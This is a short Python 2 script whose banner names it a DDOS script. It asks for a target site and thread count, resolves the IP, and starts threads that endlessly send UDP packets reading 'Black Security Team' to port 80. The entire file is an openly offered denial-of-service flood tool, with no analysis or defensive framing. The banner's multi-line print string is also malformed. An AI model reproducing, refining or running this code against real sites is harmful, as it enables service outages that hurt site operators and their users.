import time
import socket
import sys
import thread

print (' ' + ' ' + ' 
      
       ############ DDOS-SCRIPT #############
     ##################         ################ 
      ### create by @victor_cyber in #rubika ###
       ######### ######## WE LOVE IRAN #######
            #######                ####### ')

site = raw_input("Enter your site url = ")
thread_count = input("Enter your thread = ")

ip = socket.gethostbyname(site)

UDP_PORT = 80
MESSAGE = "Black Security Team"
print "UDP target IP:", ip
print "UDP target port:", UDP_PORT
time.sleep(3)

def dos(i):
  while True:  
      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      sock.sendto(MESSAGE, (ip, UDP_PORT))
      print "Packet Sent"
    
for i in xrange(thread_count):
  try:
   thread.start_new_thread( dos , ("Thread-"+str(i),) )
  except KeyboardInterrupt:
      sys.exit(0)
while 1:
  pass
